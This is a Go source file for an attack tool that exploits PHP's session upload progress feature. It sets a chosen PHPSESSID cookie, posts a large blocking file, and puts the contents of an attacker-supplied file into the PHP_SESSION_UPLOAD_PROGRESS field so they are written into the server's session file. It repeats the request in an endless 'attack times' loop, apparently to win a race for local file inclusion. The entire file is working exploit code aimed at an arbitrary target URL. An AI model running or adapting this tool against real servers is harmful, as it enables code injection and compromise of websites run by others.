package main

import (
	"flag"
	"fmt"
	"github.com/Mick-code/Bubb1eGoLib/Request"
	"io/ioutil"
	"os"
)

func main() {
	var phpsessid string
	var filepath string
	var bigfilepath string
	var url string
	var zip bool

	flag.StringVar(&phpsessid,"s","bubb1esession","phpsessid,default value is bubb1esession")
	flag.StringVar(&filepath,"f","","inject filepath,default value is  null")
	flag.StringVar(&url,"u","","target url ,default value is  null")
	flag.BoolVar(&zip,"zip",false,"to use zip protocal ,default value is  false")
	flag.StringVar(&bigfilepath,"bf","","big filepath(for Blocking process),default value is  null")
	flag.Parse()

	header:= make(map[string]string)
	header["Cookie"] = "PHPSESSID="+phpsessid

	files := make(map[[2]string][]byte)
	f,_ := os.Open(bigfilepath)
	defer f.Close()
	res,_  := ioutil.ReadAll(f)
	files[[2]string{"file1","bigfile"}] = res



	f,_ = os.Open(filepath)
	defer f.Close()
	res,_  = ioutil.ReadAll(f)
	value := make(map[string][]byte)
	if(zip){
		value["PHP_SESSION_UPLOAD_PROGRESS"] = res[16:]
	}else{
		value["PHP_SESSION_UPLOAD_PROGRESS"] = res
	}
	r :=  Request.Request{}
	r.Url = url
	r.Header = header
	r.PostFile = files
	r.PostValue = value
	for i:=1;;i++{
		fmt.Println("attack times: ",i)
		r.Post()
	}



}

